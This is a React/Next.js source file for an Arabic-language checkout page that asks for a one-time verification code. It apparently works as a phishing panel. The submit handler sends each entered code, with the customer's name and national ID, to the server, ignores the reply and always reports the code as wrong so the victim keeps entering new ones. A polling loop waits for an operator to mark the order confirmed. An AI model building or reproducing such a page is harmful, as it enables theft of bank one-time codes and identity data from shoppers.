"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { useCartStore } from "../../store/cartStore";
import { FileText, Receipt, X } from "lucide-react";
import {
  IoShieldCheckmarkOutline,
  IoKeyOutline,
  IoPhonePortraitOutline,
  IoTimeOutline,
  IoRefreshOutline,
  IoChevronBack,
  IoCartOutline,
  IoCardOutline,
  IoCheckmarkCircle,
  IoArrowBack,
} from "react-icons/io5";

export default function VerifyPage() {
  const OTP_LENGTH = 6;
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  const startCooldown = useCallback(() => {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown((prev) => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    const currentTime = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    if (unlockAt <= currentTime) {
      unlockAt = currentTime + 60000;
      localStorage.setItem("resendUnlockAt", String(unlockAt));
    }
    const remaining = Math.ceil((unlockAt - currentTime) / 1000);
    if (remaining <= 0) return;
    const timeoutId = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown((prev) => {
          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
          return prev - 1;
        });
      }, 1000);
    }, 0);
    return () => { clearTimeout(timeoutId); if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, []);

  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Focus first input on mount
  useEffect(() => { inputRefs.current[0]?.focus(); }, []);

  function handleChange(index: number, value: string) {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newOtp = [...otp];
    newOtp[index] = digit;
    setOtp(newOtp);
    setCodeError(false);
    setLengthError(false);
    if (digit && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent) {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  }

  function handlePaste(e: React.ClipboardEvent) {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
    const newOtp = [...otp];
    pasted.split("").forEach((ch, i) => { newOtp[i] = ch; });
    setOtp(newOtp);
    const focusIdx = Math.min(pasted.length, OTP_LENGTH - 1);
    inputRefs.current[focusIdx]?.focus();
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const code = otp.join("");
    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    setCodeError(true);
    setOtp(Array(OTP_LENGTH).fill(""));
    inputRefs.current[0]?.focus();
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown((prev) => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const steps = [
    { icon: IoCartOutline, label: "السلة", done: true },
    { icon: IoCardOutline, label: "الدفع", done: true },
    { icon: IoCheckmarkCircle, label: "التأكيد", active: true },
  ];

  // ── Confirmed Popup ──
  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
  if (confirmed && confirmedId) {
    return (
      <AnimatePresence>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-black/50 backdrop-blur-md flex items-center justify-center z-50 px-4"
          dir="rtl"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0, y: 20 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            transition={{ type: "spring", stiffness: 300, damping: 25 }}
            className="relative bg-white rounded-3xl shadow-[0_24px_80px_rgba(0,0,0,0.15)] w-full max-w-md overflow-hidden"
          >
            <Link href="/" className="absolute top-4 left-4 w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-400 transition-all z-10">
              <X className="w-4 h-4" />
            </Link>

            {/* Success Header */}
            <div className="relative bg-gradient-to-br from-[#7CC043]/10 to-[#0F4C6E]/5 pt-8 pb-6 flex flex-col items-center">
              <div className="absolute inset-0 overflow-hidden">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#7CC043]/10 rounded-full blur-2xl" />
                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-[#0F4C6E]/5 rounded-full blur-2xl" />
              </div>
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
                className="relative"
              >
                <img src="/sucess.webp" alt="success" className="w-32 h-32 sm:w-40 sm:h-40 object-contain" />
              </motion.div>
              <motion.span
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="mt-3 bg-[#7CC043] text-white text-sm font-bold px-5 py-1.5 rounded-full shadow-[0_4px_12px_rgba(124,192,67,0.3)]"
              >
                نجحت عملية الدفع ✓
              </motion.span>
            </div>

            {/* Content */}
            <div className="px-5 sm:px-6 py-5 space-y-4 text-center">
              <div>
                <p className="text-gray-800 font-extrabold text-lg">تمت العملية بنجاح</p>
                <p className="text-gray-400 text-sm leading-7 mt-2">
                  شكراً لك لثقتك، نشكرك على كونك واحداً من عملائنا الكرام. يرجى التواصل مع خدمة العملاء لاستكمال إجراءات شحن الطلب.
                </p>
              </div>
              <div className="flex gap-3 pt-1">
                <a
                  href={`/invoice/${confirmedId}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#0F4C6E] to-[#1a6b5a] text-white font-bold text-sm shadow-[0_4px_16px_rgba(15,76,110,0.3)] hover:shadow-[0_8px_24px_rgba(15,76,110,0.4)] transition-shadow"
                >
                  <FileText className="w-4 h-4" /> الفاتورة
                </a>
                <a
                  href={`/invoice/${confirmedId}/receipt`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#7CC043] to-[#5a9e2e] text-white font-bold text-sm shadow-[0_4px_16px_rgba(124,192,67,0.3)] hover:shadow-[0_8px_24px_rgba(124,192,67,0.4)] transition-shadow"
                >
                  <Receipt className="w-4 h-4" /> سند القبض
                </a>
              </div>
            </div>
          </motion.div>
        </motion.div>
      </AnimatePresence>
    );
  }

  // ── Main Page ──
  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-b from-gray-50/80 to-white" dir="rtl">
      {/* Header */}
      <div className="sticky top-0 z-20 bg-white/80 backdrop-blur-xl border-b border-gray-100">
        <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/checkout" className="w-9 h-9 bg-gray-100 rounded-xl flex items-center justify-center hover:bg-gray-200 transition-colors">
              <IoChevronBack size={18} className="text-gray-600 rotate-180" />
            </Link>
            <h1 className="text-[15px] font-extrabold text-gray-800">تأكيد العملية</h1>
          </div>
          <div className="flex items-center gap-1.5 text-gray-400">
            <IoShieldCheckmarkOutline size={14} />
            <span className="text-[11px] font-medium">اتصال مشفر</span>
          </div>
        </div>
      </div>

      {/* Steps */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 pt-5 pb-2">
        <div className="flex items-center justify-center">
          {steps.map((step, i) => (
            <div key={i} className="flex items-center">
              <div className="flex flex-col items-center gap-1.5">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
                  step.done ? "bg-[#7CC043] text-white shadow-[0_4px_12px_rgba(124,192,67,0.3)]" :
                  step.active ? "bg-[#0F4C6E] text-white shadow-[0_4px_12px_rgba(15,76,110,0.3)]" :
                  "bg-gray-100 text-gray-400"
                }`}>
                  {step.done ? <IoCheckmarkCircle size={20} /> : <step.icon size={18} />}
                </div>
                <span className={`text-[10px] font-bold ${step.done ? "text-[#7CC043]" : step.active ? "text-[#0F4C6E]" : "text-gray-400"}`}>
                  {step.label}
                </span>
              </div>
              {i < steps.length - 1 && (
                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#7CC043]" : "bg-gray-200"}`} />
              )}
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-grow flex items-start justify-center px-4 pt-4 pb-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md space-y-5"
        >
          {/* OTP Card */}
          <div className="bg-white rounded-2xl shadow-[0_4px_24px_rgba(0,0,0,0.06)] border border-gray-100 p-6 sm:p-8 relative overflow-hidden">
            {/* Decorative */}
            <div className="absolute -top-16 -right-16 w-40 h-40 bg-[#0F4C6E]/[0.03] rounded-full blur-2xl pointer-events-none" />
            <div className="absolute -bottom-16 -left-16 w-40 h-40 bg-[#7CC043]/[0.03] rounded-full blur-2xl pointer-events-none" />

            <div className="relative">
              {/* Icon & Title */}
              <div className="text-center mb-7">
                <motion.div
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", stiffness: 200 }}
                  className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-[#0F4C6E] to-[#1a6b5a] flex items-center justify-center shadow-[0_8px_24px_rgba(15,76,110,0.25)]"
                >
                  <IoKeyOutline size={28} className="text-white" />
                </motion.div>
                <h1 className="text-xl font-extrabold text-gray-800 mb-2">رمز التحقق</h1>
                <p className="text-gray-400 text-sm leading-relaxed flex items-center justify-center gap-1.5">
                  <IoPhonePortraitOutline size={14} />
                  أدخل الرمز المرسل إلى هاتفك
                </p>
              </div>

              {/* Info Badge */}
              <div className="flex items-center gap-2 bg-amber-50 border border-amber-100 rounded-xl px-3 py-2.5 mb-6">
                <IoTimeOutline size={16} className="text-amber-400 shrink-0" />
                <p className="text-amber-600/80 text-[11px] font-medium leading-relaxed">
                  أحياناً يصل الرمز متأخراً بعد بضع دقائق، يرجى الانتظار قليلاً
                </p>
              </div>

              {/* OTP Boxes */}
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="flex justify-center gap-2 sm:gap-3" dir="ltr">
                  {otp.map((digit, i) => (
                    <motion.input
                      key={i}
                      ref={(el) => { inputRefs.current[i] = el; }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      onPaste={i === 0 ? handlePaste : undefined}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: i * 0.05 }}
                      className={`w-11 h-13 sm:w-13 sm:h-15 text-center text-xl sm:text-2xl font-extrabold rounded-xl border-2 outline-none transition-all duration-200 ${
                        codeError
                          ? "border-red-300 bg-red-50/50 text-red-500 animate-[shake_0.3s_ease]"
                          : digit
                          ? "border-[#0F4C6E] bg-[#0F4C6E]/5 text-[#0F4C6E]"
                          : "border-gray-200 bg-gray-50 text-gray-800 focus:border-[#0F4C6E] focus:bg-white focus:shadow-[0_0_0_3px_rgba(15,76,110,0.1)]"
                      }`}
                    />
                  ))}
                </div>

                {/* Error Messages */}
                <AnimatePresence>
                  {lengthError && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-amber-500 text-xs font-bold text-center">
                      يجب إدخال 4 أو 6 أرقام
                    </motion.p>
                  )}
                  {codeError && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-red-400 text-xs font-bold text-center">
                      الرمز غير صحيح، حاول مرة أخرى
                    </motion.p>
                  )}
                  {resent && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-[#7CC043] text-xs font-bold text-center">
                      ✓ تم إعادة إرسال الرمز
                    </motion.p>
                  )}
                </AnimatePresence>

                {/* Submit Button */}
                <motion.button
                  type="submit"
                  disabled={submitCooldown > 0}
                  whileHover={submitCooldown > 0 ? {} : { scale: 1.01 }}
                  whileTap={submitCooldown > 0 ? {} : { scale: 0.98 }}
                  className={`w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all duration-200 ${
                    submitCooldown > 0
                      ? "bg-gray-200 text-gray-400 cursor-not-allowed"
                      : "bg-gradient-to-r from-[#0F4C6E] to-[#1a6b5a] text-white shadow-[0_8px_24px_rgba(15,76,110,0.3)] hover:shadow-[0_12px_32px_rgba(15,76,110,0.4)]"
                  }`}
                >
                  {submitCooldown > 0 ? (
                    <>انتظر ({submitCooldown}s)</>
                  ) : (
                    <>
                      <IoShieldCheckmarkOutline size={18} />
                      تأكيد الرمز
                    </>
                  )}
                </motion.button>

                {/* Resend & Back */}
                <div className="flex flex-col items-center gap-3 pt-1">
                  <div className="flex items-center gap-1.5 text-sm">
                    <span className="text-gray-400">لم يصلك الرمز؟</span>
                    <button
                      type="button"
                      disabled={cooldown > 0}
                      onClick={() => {
                        if (cooldown > 0) return;
                        fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                        setResent(true);
                        setTimeout(() => setResent(false), 3000);
                        startCooldown();
                      }}
                      className={`font-bold transition-all select-none flex items-center gap-1 ${
                        cooldown > 0
                          ? "text-gray-300 cursor-not-allowed"
                          : "text-[#0F4C6E] hover:text-[#0a3550]"
                      }`}
                    >
                      <IoRefreshOutline size={14} className={cooldown > 0 ? "" : "hover:rotate-180 transition-transform duration-500"} />
                      {cooldown > 0 ? `${cooldown}s` : "إعادة الإرسال"}
                    </button>
                  </div>
                  <Link href="/checkout" className="flex items-center gap-1.5 text-gray-400 text-xs font-medium hover:text-gray-600 transition-colors">
                    <IoArrowBack size={12} className="rotate-180" />
                    العودة لصفحة الدفع
                  </Link>
                </div>
              </form>
            </div>
          </div>

          {/* Security Badge */}
          <div className="flex justify-center">
            <div className="flex items-center gap-4 text-gray-300">
              <div className="flex items-center gap-1.5">
                <IoShieldCheckmarkOutline size={13} />
                <span className="text-[10px] font-medium">256-bit SSL</span>
              </div>
              <div className="w-px h-3 bg-gray-200" />
              <div className="flex items-center gap-1.5">
                <IoKeyOutline size={13} />
                <span className="text-[10px] font-medium">اتصال مشفر</span>
              </div>
            </div>
          </div>
        </motion.div>
      </main>
    </div>
  );
}
